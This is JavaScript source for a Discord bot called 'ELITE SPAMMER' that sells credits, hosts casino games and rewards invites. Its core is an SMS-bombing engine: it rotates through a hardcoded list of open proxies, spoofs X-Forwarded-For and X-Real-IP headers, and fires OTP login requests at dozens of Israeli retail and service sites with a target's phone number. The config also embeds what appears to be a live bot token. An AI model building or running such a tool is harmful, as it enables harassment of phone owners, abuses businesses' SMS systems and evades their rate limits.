const PROXIES = [
    'http://85.214.107.177:80',
    'http://213.226.127.45:8000',
    'http://159.203.13.121:80',
    'http://202.137.134.160:8088',
    'http://195.154.84.47:3128',
    'http://93.191.63.227:8080',
    'http://78.47.244.211:8080',
    'http://178.49.14.57:3128',
    'http://38.51.232.19:8080',
    'http://5.202.191.225:80',
    'http://139.144.224.11:8080',
    'http://51.68.124.241:80',
    'http://200.61.16.80:8080',
    'http://210.48.237.116:8080',
    'http://217.52.247.85:1976',
    'http://152.228.217.116:80',
    'http://179.61.229.162:999',
    'http://5.78.86.37:8080',
    'http://5.78.83.87:8080',
    'http://45.174.87.18:999',
    'http://74.114.232.162:8080',
    'http://8.210.223.21:80',
    'http://190.71.24.129:999',
    'http://103.161.31.249:83',
    'http://85.117.239.113:3128',
    'http://213.82.87.21:443',
    'http://78.188.81.57:8080',
    'http://41.65.236.37:1981',
    'http://194.5.176.88:32654',
    'http://115.248.66.131:3129',
    'http://119.93.129.34:80',
    'http://123.202.159.108:80',
    'http://47.254.198.237:3128',
    'http://165.3.2.136:3128',
    'http://62.193.108.138:1976',
    'http://223.205.110.208:8080',
    'http://167.235.35.185:3128',
    'http://152.228.217.116:80',
    'http://38.7.207.92:80',
    'http://58.69.201.117:8082',
    'http://124.40.246.210:8080',
    'http://103.30.127.22:18081',
    'http://45.225.107.100:1994',
    'http://190.69.157.213:999',
    'http://160.3.168.70:8080',
    'http://211.43.214.205:80',
    'http://46.8.19.27:8443',
    'http://81.161.236.152:8080',
    'http://197.45.109.146:1976',
    'http://1.10.141.115:8080',
    'http://196.47.63.65:8080',
    'http://155.50.215.37:3128',
    'http://192.81.128.182:8089',
    'http://87.250.63.90:8080',
    'http://200.52.148.10:999',
    'http://95.183.140.94:80',
    'http://201.238.248.134:443',
    'http://77.91.74.77:80',
    'http://194.124.37.20:8080',
    'http://88.87.95.143:5948',
    'http://45.188.167.25:999',
    'http://35.227.57.1:3128',
    'http://103.51.21.250:83',
    'http://157.90.217.209:3128',
    'http://45.70.236.193:999',
    'http://158.69.157.172:80',
    'http://134.122.22.233:3128',
    'http://5.78.88.133:8080',
    'http://190.221.174.130:8080',
    'http://172.105.107.223:3128',
    'http://31.220.183.217:53281',
    'http://45.70.236.194:999',
    'http://95.31.5.29:54651',
    'http://13.232.245.132:80',
    'http://95.216.230.239:80',
    'http://51.103.137.65:80',
    'http://49.0.88.27:8080',
    'http://178.128.157.114:443',
    'http://14.187.141.43:19132',
    'http://85.238.74.91:8080',
    'http://119.237.43.106:80',
    'http://103.17.213.102:8080',
    'http://164.52.192.156:80',
    'http://172.105.90.122:8080',
    'http://94.177.249.42:3128',
    'http://61.7.137.128:8080',
    'http://103.149.194.79:32650',
    'http://91.92.208.172:8080',
    'http://94.102.235.131:32650',
    'http://34.239.204.118:80',
    'http://189.222.40.79:999',
    'http://218.41.170.110:20000',
    'http://103.159.46.2:83',
    'http://152.32.148.233:3128',
    'http://31.214.171.62:3128',
    'http://65.109.231.48:8080',
    'http://139.177.183.22:8080',
    'http://196.1.95.124:80',
    'http://94.158.53.145:3128',
    'http://5.78.86.6:8080',
    'http://80.240.201.62:83',
    'http://185.39.17.75:8080',
    'http://15.236.135.81:80',
    'http://5.78.86.37:8080',
    'http://201.159.113.25:1994',
    'http://5.75.155.221:8888',
    'http://125.25.40.41:32650',
    'http://41.65.227.103:1981',
    'http://123.203.124.54:8080',
    'http://78.188.81.57:8080',
    'http://94.100.26.202:80',
    'http://149.126.101.162:8080',
    'http://24.156.198.241:8080',
    'http://8.218.69.5:8000',
    'http://190.152.5.17:39888',
    'http://1.4.214.178:8080',
    'http://45.70.200.165:999',
    'http://149.57.11.17:8181',
    'http://196.207.24.222:8080',
    'http://170.155.2.119:80',
    'http://5.104.174.199:23500',
    'http://185.103.87.30:8081',
    'http://103.75.117.79:80',
    'http://41.65.227.103:1981',
    'http://45.181.122.74:999',
    'http://190.111.209.207:3128',
    'http://69.94.136.71:8443',
    'http://14.46.231.109:8001',
    'http://203.78.235.132:3128',
    'http://131.196.82.70:999',
    'http://190.238.231.65:1994',
    'http://190.61.84.166:9812',
    'http://143.44.191.108:8080',
    'http://162.240.75.37:80',
    'http://45.225.185.63:999',
    'http://5.160.175.226:8383',
    'http://81.134.57.82:3128',
    'http://187.204.126.28:8081',
    'http://94.253.82.229:8080',
    'http://24.121.213.80:3128',
    'http://93.175.204.173:8080',
    'http://167.235.231.57:80',
    'http://138.2.79.142:3128',
    'http://20.24.81.3:8080',
    'http://5.78.93.11:8080',
    'http://38.49.138.136:999',
    'http://202.137.144.228:8080',
    'http://185.73.202.85:80',
    'http://216.215.123.174:8080',
    'http://52.58.90.91:80',
    'http://179.61.229.162:999',
    'http://45.162.135.201:999',
    'http://173.212.209.233:3128',
    'http://199.38.246.253:4444',
    'http://41.33.66.228:1976',
    'http://208.109.32.60:81',
    'http://5.78.79.193:8080',
    'http://181.120.28.228:80',
    'http://212.112.127.20:8080',
    'http://18.144.77.146:80',
    'http://77.233.5.68:55443',
    'http://95.217.104.21:17942',
    'http://159.192.138.170:8080',
    'http://190.61.88.147:8080',
    'http://112.198.179.67:8080',
    'http://115.133.22.97:6666',
    'http://138.117.229.17:999',
    'http://52.88.105.39:80',
];

let proxyIndex = 0;
function getNextProxy() {
    const proxy = PROXIES[proxyIndex % PROXIES.length];
    proxyIndex++;
    return proxy;
}

const CONFIG = {
    TOKEN: process.env.TOKEN || 'MTU2MjYxMzIyODk4MTQ2MTA5Mg.G85k2l.euQZfH9bg-PiqwAAISK-vblaEvixleI917Mhe8',
    GUILD_ID: '1562615242587119799',
    PANEL_CHANNEL_ID: '1562825530586439711',
    FREE_CREDITS_CHANNEL_ID: '1562825639722098698',
    INVITES_CHANNEL_ID: '1562825818629996685',
    BOOST_CHANNEL_ID: '1562825867694964816',
    LEADERBOARD_CHANNEL_ID: '1562825895306207272',
    INVITE_REWARDS_CHANNEL_ID: '1562825818629996685',
    INFO_CHANNEL_ID: '1562825639722098698',
    ROLE_CREDITS_CHANNEL_ID: '1562825639722098698',
    REQUIRED_ROLE_ID: '1521743731366166548',
    CASINO_COINFLIP_CHANNEL: '1562826089057751091',
    CASINO_BLACKJACK_CHANNEL: '1562826144565432340',
    CASINO_ROULETTE_CHANNEL: '1562826228866752642',
    CASINO_MINES_CHANNEL: '1562826285787648142',
    BUY_CREDITS_URL: 'https://elite-spam-il.mysellauth.com/',
    ADMIN_IDS: ['המזהה_שלך'],
    REQUIRED_SERVER_ID: '1562615242587119799',
    INVITE_LINK: 'הקישור_שלך',
    BUYERS_LEADERBOARD_CHANNEL_ID: '',
    BUYERS_ROLE_ID: '',
    SMS_LOGS_CHANNEL_ID: '1562825530586439711',
};
    
// מערכת שלבי מתנות על הזמנות
const INVITE_REWARD_TIERS = [
    { invites: 2, credits: 5 },
    { invites: 5, credits: 15 },
    { invites: 10, credits: 35 },
];

const http = require('http');
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, SlashCommandBuilder, Events } = require('discord.js');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { setTimeout: delay } = require('timers/promises');
const fs = require('fs');

const DB_FILE = './db.json';
let db = {
    users: {},
    blacklist: {},
    settings: {},
    invites_claimed: {},
    casino_stats: {},
    invite_milestones_claimed: {},
};

// Store only invite code and uses count, NOT the full invite objects
const guildInvites = new Map();
const activeGames = new Map();
const gameTimeouts = new Map();

// ===== GITHUB DB SYNC =====
const GH_TOKEN  = process.env.GH_TOKEN  || '';
const GH_REPO   = process.env.GH_REPO   || 'sp0mm0r999/Spammer-discord';
const GH_BRANCH = process.env.GH_BRANCH || 'main';
const GH_PATH   = 'db.json';
const GH_API    = 'https://api.github.com/repos/' + GH_REPO + '/contents/' + GH_PATH;
const GH_HEADERS = () => ({ Authorization: 'Bearer ' + GH_TOKEN, 'User-Agent': 'spam-bot', Accept: 'application/vnd.github+json' });
let dbDirty = false;

async function ghRestoreDb() {
    if (!GH_TOKEN) { console.log('[GH] no GH_TOKEN, skipping restore'); return; }
    try {
        const r = await axios.get(GH_API, { headers: GH_HEADERS(), params: { ref: GH_BRANCH }, timeout: 15000 });
        const content = Buffer.from(r.data.content, 'base64').toString('utf8');
        JSON.parse(content);
        fs.writeFileSync(DB_FILE, content, 'utf8');
        console.log('[GH] db.json restored from GitHub');
    } catch (e) {
        console.log('[GH] restore skipped:', e.response ? e.response.status : e.message);
    }
}

async function ghPushDb() {
    if (!GH_TOKEN || !dbDirty) return;
    try {
        let sha = null;
        try {
            const cur = await axios.get(GH_API, { headers: GH_HEADERS(), params: { ref: GH_BRANCH }, timeout: 15000 });
            sha = cur.data.sha;
        } catch (e) { /* הקובץ עוד לא קיים */ }

        const content = fs.readFileSync(DB_FILE, 'utf8');
        await axios.put(GH_API, {
            message: 'db sync ' + new Date().toISOString() + ' [skip ci]',
            content: Buffer.from(content, 'utf8').toString('base64'),
            branch: GH_BRANCH,
            ...(sha ? { sha } : {}),
        }, { headers: GH_HEADERS(), timeout: 20000 });

        dbDirty = false;
        console.log('[GH] db.json pushed to GitHub');
    } catch (e) {
        console.log('[GH] push failed:', e.response ? e.response.status : e.message);
    }
}

function loadDb() {
    try {
        if (fs.existsSync(DB_FILE)) {
            const data = fs.readFileSync(DB_FILE, 'utf8');
            db = JSON.parse(data);
            db.users = db.users || {};
            db.blacklist = db.blacklist || {};
            db.settings = db.settings || {};
            db.invites_claimed = db.invites_claimed || {};
            db.casino_stats = db.casino_stats || {};
            db.invite_milestones_claimed = db.invite_milestones_claimed || {};
        }
    } catch (err) {
        console.error('Failed to load database:', err);
        db = {
            users: {},
            blacklist: {},
            settings: {},
            invites_claimed: {},
            casino_stats: {},
            invite_milestones_claimed: {},
        };
    }
}
function saveDb() {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2), 'utf8');
        dbDirty = true;
        updateLeaderboardMessage().catch(() => {});
    } catch (err) {
        console.error('Failed to save database:', err);
    }
}

// Helper function to fetch invites and store only code/uses
async function fetchAndStoreInvites(guild) {
    try {
        const invites = await guild.invites.fetch().catch(() => null);
        if (!invites) return null;

        // Store only what we need: { code, uses, inviterId }
        const inviteMap = new Map();
        invites.forEach(inv => {
            inviteMap.set(inv.code, {
                uses: inv.uses,
                inviterId: inv.inviter?.id || null
            });
        });

        guildInvites.set(guild.id, inviteMap);
        return inviteMap;
    } catch (err) {
        console.error('[Invite Fetch Error]', err);
        return null;
    }
}

loadDb();

function getOrCreateUser(id) {
    const uid = String(id);
    if (!db.users[uid]) db.users[uid] = { credits: 0, lifetime: false, total_invites: 0, claimed_invites: 0 };
    if (db.users[uid].total_invites === undefined) db.users[uid].total_invites = 0;
    if (db.users[uid].claimed_invites === undefined) db.users[uid].claimed_invites = 0;
    return db.users[uid];
}

function getOrCreateStats(id) {
    const uid = String(id);
    if (!db.casino_stats[uid]) {
        db.casino_stats[uid] = {
            coinflip: { wins: 0, losses: 0, profit: 0 },
            blackjack: { wins: 0, losses: 0, pushes: 0, profit: 0 },
            roulette: { wins: 0, losses: 0, profit: 0 },
            mines: { wins: 0, losses: 0, profit: 0 },
        };
    }
    return db.casino_stats[uid];
}

const getCredits = id => getOrCreateUser(id).credits;
const addCredits = (id, a) => { getOrCreateUser(id).credits += a; saveDb(); };
const removeCredits = (id, a) => { getOrCreateUser(id).credits -= a; saveDb(); };
const setLifetime = (id, s) => { getOrCreateUser(id).lifetime = s; saveDb(); };
const hasLifetime = id => getOrCreateUser(id).lifetime;
const getBalanceDisplay = id => { const u = getOrCreateUser(id); return u.lifetime ? '∞ (Lifetime)' : String(u.credits); };

function startGame(userId, gameData) {
    if (gameTimeouts.has(userId)) {
        clearTimeout(gameTimeouts.get(userId));
    }
    activeGames.set(userId, gameData);
    const timeout = setTimeout(() => {
        if (activeGames.has(userId)) {
            endGame(userId);
            console.log('משחק של המשתמש ' + userId + ' נמחק בגלל פעילות לא רצויה');
        }
    }, 5 * 60 * 1000);
    gameTimeouts.set(userId, timeout);
}

function endGame(userId) {
    if (gameTimeouts.has(userId)) {
        clearTimeout(gameTimeouts.get(userId));
        gameTimeouts.delete(userId);
    }
    activeGames.delete(userId);
}

function grantLifetime(id) {
    const user = getOrCreateUser(id);
    if (user.lifetime) return false;
    user.preLifetimeCredits = user.credits;
    user.lifetime = true;
    saveDb();
    return true;
}

function revokeLifetime(id) {
    const user = getOrCreateUser(id);
    if (!user.lifetime) return false;
    user.lifetime = false;
    if (typeof user.preLifetimeCredits === 'number') {
        user.credits = user.preLifetimeCredits;
        delete user.preLifetimeCredits;
    } else {
        user.credits = 0;
    }
    saveDb();
    return true;
}

function isPhoneBlacklisted(phone) {
    const e = db.blacklist[phone];
    if (!e) return false;
    if (e.expires && Date.now() > e.expires) { delete db.blacklist[phone]; saveDb(); return false; }
    return true;
}
function blacklistPhone(phone, days = 0) { db.blacklist[phone] = { expires: days > 0 ? Date.now() + days * 86400000 : null }; saveDb(); }
function unblacklistPhone(phone) { delete db.blacklist[phone]; saveDb(); }

function getLastFreeClaim(uid) { return db.settings[uid]?.free_credits?.last_claim || 0; }
function setLastFreeClaim(uid, ts) {
    if (!db.settings[uid]) db.settings[uid] = {};
    if (!db.settings[uid].free_credits) db.settings[uid].free_credits = {};
    db.settings[uid].free_credits.last_claim = ts;
    saveDb();
}

function getLastBoostClaim(uid) { return db.settings[uid]?.boost_credits?.last_claim || 0; }
function setLastBoostClaim(uid, ts) {
    if (!db.settings[uid]) db.settings[uid] = {};
    if (!db.settings[uid].boost_credits) db.settings[uid].boost_credits = {};
    db.settings[uid].boost_credits.last_claim = ts;
    saveDb();
}

// פונקציות לעבודה עם שלבי הזמנות
function getClaimedMilestones(uid) {
    return db.invite_milestones_claimed[uid] || [];
}
function addClaimedMilestone(uid, milestone) {
    if (!db.invite_milestones_claimed[uid]) db.invite_milestones_claimed[uid] = [];
    if (!db.invite_milestones_claimed[uid].includes(milestone)) {
        db.invite_milestones_claimed[uid].push(milestone);
        saveDb();
    }
}

const userCooldowns = new Map();
const phoneCooldowns = new Map();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildInvites
    ],
});

const cardValues = { '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9, '10': 10, 'J': 10, 'Q': 10, 'K': 10, 'A': 11 };
const suits = ['♠', '♥', '♦', '♣'];
const ranks = ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K', 'A'];

function createDeck() {
    const deck = [];
    for (const suit of suits) {
        for (const rank of ranks) {
            deck.push({ rank, suit });
        }
    }
    for (let i = deck.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [deck[i], deck[j]] = [deck[j], deck[i]];
    }
    return deck;
}

function calculateHand(hand) {
    let value = 0;
    let aces = 0;
    for (const card of hand) {
        value += cardValues[card.rank];
        if (card.rank === 'A') aces++;
    }
    while (value > 21 && aces > 0) {
        value -= 10;
        aces--;
    }
    return value;
}

function formatHand(hand) {
    return hand.map(c => c.rank + c.suit).join(' ');
}

const rouletteNumbers = [
    { num: 0, color: 'green' },
    { num: 32, color: 'red' },
    { num: 15, color: 'black' },
    { num: 19, color: 'red' },
    { num: 4, color: 'black' },
    { num: 21, color: 'red' },
    { num: 2, color: 'black' },
    { num: 25, color: 'red' },
    { num: 17, color: 'black' },
    { num: 34, color: 'red' },
    { num: 6, color: 'black' },
    { num: 27, color: 'red' },
    { num: 13, color: 'black' },
    { num: 36, color: 'red' },
    { num: 11, color: 'black' },
    { num: 30, color: 'red' },
    { num: 8, color: 'black' },
    { num: 23, color: 'red' },
    { num: 10, color: 'black' },
    { num: 5, color: 'red' },
    { num: 24, color: 'black' },
    { num: 16, color: 'red' },
    { num: 33, color: 'black' },
    { num: 1, color: 'red' },
    { num: 20, color: 'black' },
    { num: 14, color: 'red' },
    { num: 31, color: 'black' },
    { num: 9, color: 'red' },
    { num: 22, color: 'black' },
    { num: 18, color: 'red' },
    { num: 29, color: 'black' },
    { num: 7, color: 'red' },
    { num: 28, color: 'black' },
    { num: 12, color: 'red' },
    { num: 35, color: 'black' },
    { num: 3, color: 'red' },
    { num: 26, color: 'black' },
];

async function updateLeaderboardMessage() {
    const lbCh = client.channels.cache.get(CONFIG.LEADERBOARD_CHANNEL_ID);
    if (!lbCh) return;

    const sortedUsers = Object.entries(db.users)
        .map(([id, data]) => ({ id, ...data }))
        .sort((a, b) => {
            if (a.lifetime && !b.lifetime) return -1;
            if (!a.lifetime && b.lifetime) return 1;
            return b.credits - a.credits;
        })
        .slice(0, 10);

    let description = '🏆 עשרת המשתמשים העשירים ביותר בבוט 🏆\n\n';

    if (sortedUsers.length === 0) {
        description += '*אין עדיין משתמשים ברשימה...*';
    } else {
        for (let i = 0; i < sortedUsers.length; i++) {
            const uData = sortedUsers[i];
            let medal = '**[#' + (i + 1) + ']**';
            if (i === 0) medal = '👑 המקום הראשון:';
            else if (i === 1) medal = '🥈 מקום שני:';
            else if (i === 2) medal = '🥉 מקום שלישי:';

            const creditDisplay = uData.lifetime ? '∞ (Lifetime)' : uData.credits + ' קרדיטים';
            description += medal + ' <@' + uData.id + '> • ' + creditDisplay + '\n';
        }
    }

    const embed = new EmbedBuilder()
        .setTitle('📈 ELITE SPAMMER - LEADERBOARD 📈')
        .setDescription(description)
        .setColor(0xff0000)
        .setThumbnail(client.user.displayAvatarURL())
        .setTimestamp()
        .setFooter({ text: 'הטבלה מתעדכנת אוטומטית בכל שינוי!', iconURL: client.user.displayAvatarURL() });

    const messages = await lbCh.messages.fetch({ limit: 5 }).catch(() => null);
    if (!messages) return;
    const oldMsg = messages.find(m => m.author.id === client.user.id && m.embeds[0]?.title === '📈 ELITE SPAMMER - LEADERBOARD 📈');

    if (oldMsg) {
        await oldMsg.edit({ embeds: [embed] });
    } else {
        await lbCh.send({ embeds: [embed] });
    }
}

async function fire(method, url, opts = {}) {
    try {
        const proxy = getNextProxy();
        const agent = new HttpsProxyAgent(proxy);
        const ip = '77.137.' + (Math.floor(Math.random() * 255) + 1) + '.' + (Math.floor(Math.random() * 255) + 1);
        const config = {
            method,
            url,
            timeout: 8000,
            httpsAgent: agent,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'he,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'X-Requested-With': 'XMLHttpRequest',
                'Sec-Ch-Ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'X-Forwarded-For': ip,
                'X-Real-IP': ip,
                ...(opts.headers || {}),
            },
        };
        if (opts.json) {
            config.data = opts.json;
            config.headers['Content-Type'] = 'application/json';
        } else if (opts.data) {
            config.data = new URLSearchParams(opts.data).toString();
            config.headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
        } else if (opts.body) {
            config.data = opts.body;
        }
        if (opts.referer) {
            config.headers['Referer'] = opts.referer;
        }

        console.log(`[FIRE] Sending request to ${url} with proxy ${proxy}`);
        const response = await axios(config);
        console.log(`[FIRE] Success for ${url} - Status: ${response.status}`);
        return;
    } catch (error) {
        console.log(`[FIRE] Proxy failed for ${url} - ${error.message}`);
        if (error.response) {
            console.log(`[FIRE] Response status: ${error.response.status}, data:`, error.response.data);
        }
        console.log(`[FIRE] Retrying ${url} WITHOUT proxy...`);
    }

    // Fallback to no proxy
    const configNoProxy = {
        method,
        url,
        timeout: 8000,
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'he,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'X-Requested-With': 'XMLHttpRequest',
            ...(opts.headers || {}),
        },
    };
    if (opts.json) {
        configNoProxy.data = opts.json;
        configNoProxy.headers['Content-Type'] = 'application/json';
    } else if (opts.data) {
        configNoProxy.data = new URLSearchParams(opts.data).toString();
        configNoProxy.headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
    } else if (opts.body) {
        configNoProxy.data = opts.body;
    }
    if (opts.referer) {
        configNoProxy.headers['Referer'] = opts.referer;
    }
    try {
        const response = await axios(configNoProxy);
        console.log(`[FIRE] Success for ${url} (no proxy) - Status: ${response.status}`);
    } catch (error) {
        console.log(`[FIRE] Final error for ${url} - ${error.message}`);
        if (error.response) {
            console.log(`[FIRE] Final response status: ${error.response.status}, data:`, error.response.data);
        }
    }
}

async function fireNoProxy(method, url, opts = {}) {
    const config = {
        method,
        url,
        timeout: 8000,
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'he,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'X-Requested-With': 'XMLHttpRequest',
            ...(opts.headers || {}),
        },
    };
    if (opts.json) {
        config.data = opts.json;
        config.headers['Content-Type'] = 'application/json';
    } else if (opts.data) {
        config.data = new URLSearchParams(opts.data).toString();
        config.headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
    } else if (opts.body) {
        config.data = opts.body;
    }
    if (opts.referer) {
        config.headers['Referer'] = opts.referer;
    }
    try {
        console.log(`[FIRE NO PROXY] Sending request to ${url}`);
        const response = await axios(config);
        console.log(`[FIRE NO PROXY] Success for ${url} - Status: ${response.status}`);
    } catch (error) {
        console.log(`[FIRE NO PROXY] Error for ${url} - ${error.message}`);
        if (error.response) {
            console.log(`[FIRE NO PROXY] Response status: ${error.response.status}, data:`, error.response.data);
        }
    }
}

function s_electra(n) { return fire('POST', 'https://www.electra-consumer.co.il/api/auth/otp/send', { json: { phone: n } }); }
function s_housemen(n) { return fire('POST', 'https://www.housemen.co.il/customer/ajax/post/', { data: { bot_validation: 1, type: 'login', telephone: n } }); }
function s_citycar(n) { return fire('POST', 'https://proxy1.citycar.co.il/api/verify/login', { json: { loginOrRegister: 1, verifyChannel: 0, phoneNumber: n } }); }
function s_paz(n) { return fire('POST', 'https://yellow.co.il/api/v1/auth/login', { json: { msisdn: n } }); }
function s_tami4(n) { return fire('POST', 'https://www.tami4.co.il/api/login/start-sms-otp', { json: { phone: n } }); }
function s_azrieli(n) { return fire('POST', 'https://www.azrieli.com/api/v1/auth/otp/send', { json: { phone: n } }); }
function s_hamal(n) { return fire('POST', 'https://users-auth.hamal.co.il/auth/send-auth-code', { json: { value: n, type: 'phone', projectId: '1' } }); }
function s_myofer(n) { return fire('POST', 'https://server.myofer.co.il/api/sendAuthSms', { json: { phoneNumber: n } }); }
function s_steimatzky(n) { return fire('POST', 'https://www.steimatzky.co.il/customer/ajax/post/', { data: { bot_validation: '1', type: 'login', telephone: n } }); }
function s_story(n) { return fire('POST', 'https://story.magicetl.com/public/shopify/apps/otp-login/step-one', { data: { bot_validation: 1, phone: n } }); }
function s_urbanica(n) { return fire('POST', 'https://www.urbanica-wh.com/customer/ajax/post/', { data: { bot_validation: 1, type: 'login', telephone: n }, referer: 'https://www.urbanica-wh.com/' }); }
function s_castro(n) { return fire('POST', 'https://www.castro.com/customer/ajax/post/', { data: { bot_validation: 1, type: 'login', telephone: n }, referer: 'https://www.castro.com/' }); }
function s_golf(n) { return fire('POST', 'https://www.golfkids.co.il/customer/ajax/post/', { data: { bot_validation: 1, type: 'login', telephone: n } }); }
function s_timberland(n) { return fire('POST', 'https://www.timberland.co.il/customer/ajax/post/', { data: { bot_validation: 1, type: 'login', telephone: n } }); }
function s_ninewest(n) { return fire('POST', 'https://www.nine-west.co.il/customer/ajax/post/', { data: { bot_validation: 1, type: 'login', telephone: n } }); }
function s_gali(n) { return fire('POST', 'https://www.gali.co.il/customer/ajax/post/', { data: { bot_validation: 1, type: 'login', telephone: n } }); }
function s_bonita(n) { return fire('POST', 'https://bonitademas.co.il/apps/imapi-customer', { json: { action: 'login', otpBy: 'sms', otpValue: n }, referer: 'https://bonitademas.co.il/' }); }
function s_femina(n) { return fire('POST', 'https://www.femina.co.il/customer/ajax/post/', { data: { bot_validation: 1, type: 'login', telephone: n } }); }
function s_naot(n) { return fire('POST', 'https://www.teva-naot.co.il/customer/ajax/post/', { data: { bot_validation: 1, type: 'login', telephone: n } }); }
function s_papajohns(n) { return fire('POST', 'https://www.papajohns.co.il/_a/aff_otp_auth', { data: { phone: n }, referer: 'https://www.papajohns.co.il/' }); }
function s_burgeranch(n) { return fire('POST', 'https://app.burgeranch.co.il/_a/aff_otp_auth', { data: { phone: n }, referer: 'https://app.burgeranch.co.il/' }); }
function s_bfresh(n) { return fire('POST', 'https://b-fresh.org.il/_a/aff_otp_auth', { data: { phone: n }, referer: 'https://b-fresh.org.il/' }); }
function s_mexicani(n) { return fire('POST', 'https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode', { data: { bot_validation: 1, club_id: '6', telephone: n } }); }
function s_emporium(n) { return fire('POST', 'https://www.emporium.co.il/customer/ajax/post/', { data: { form_key: 'lNYCSNxe73JXe3Bv', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_carolinalemke(n) { return fire('POST', 'https://www.carolinalemke.co.il/customer/ajax/post/', { data: { form_key: 'dk6p1e78wMM8JR8F', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_cottoned(n) { return fire('POST', 'https://cottonet.co.il/wp-admin/admin-ajax.php', { data: { action: 'simply-check-member-cellphone', cellphone: n } }); }
function s_leecooper(n) { return fire('POST', 'https://www.leecooper.co.il/customer/ajax/post/', { data: { form_key: '0cDRE0t6RJxRdpjC', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_aldoshoes(n) { return fire('POST', 'https://www.aldoshoes.co.il/customer/ajax/post/', { data: { form_key: 'hStT79unOK2gcjFj', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_gras(n) { return fire('POST', 'https://gras.co.il/clubmember/sms/send', { data: { mobile: n, form_key: 'qCGWuvsHLXaqNvWn' } }); }
function s_beyondskin(n) { return fire('POST', 'https://www.beyondskin.co.il/customer/ajax/post/', { data: { form_key: 'SILqVAnpZO2Ln944', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_emanuel(n) { return fire('POST', 'https://www.emanuel.co.il/customer/ajax/post/', { data: { form_key: 'XbB9Rq949adzpdWU', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_topten(n) { return fire('POST', 'https://www.topten-fashion.com/customer/ajax/post/', { data: { form_key: '1jXVmsoxSvSM3jts', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_sender(n) {
    const phone972 = '+972' + n.replace(/^0/, '');
    return fireNoProxy('POST', 'https://api.getpackage.com/v1/graphql/', {
        json: {
            operationName: 'validateLoginData',
            variables: {
                validateData: [
                    { param: 'kfdsffdsgsdf@gmail.com', type: 'EMAIL' },
                    { param: phone972, type: 'PHONE' }
                ]
            },
            query: 'query validateLoginData($validateData: [ValidateData!]!) { validateLoginData(validateData: $validateData) { type param isExist __typename } }'
        }
    });
}
function s_naamanp(n) { return fire('POST', 'https://www.naamanp.co.il/customer/ajax/post/', { data: { form_key: 'r1XybBiTdi7APTCB', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_nautica(n) { return fire('POST', 'https://www.nautica.co.il/customer/ajax/post/', { data: { form_key: 'Vlx94q75v3EAMBB0', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_delta(n) { return fire('POST', 'https://www.delta.co.il/customer/ajax/post/', { data: { form_key: 'gjPlIevoWYa47bwT', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_yvesrocher(n) { return fire('POST', 'https://www.yvesrocher.co.il/customer/ajax/post/', { data: { form_key: 'HFs36nKgRljlOE8A', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_noizz(n) { return fire('POST', 'https://www.noizz.co.il/customer/ajax/post/', { data: { form_key: '5JeJwQHc0zelGvqU', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_papaya(n) { return fire('POST', 'https://www.papaya.co.il/customer/ajax/post/', { data: { form_key: 'byablGEEPyT9Mmwj', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_bathandbody(n) { return fire('POST', 'https://www.bathandbodyworks.co.il/customer/ajax/post/', { data: { form_key: 'jtSgkXQbkjw7QjFG', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
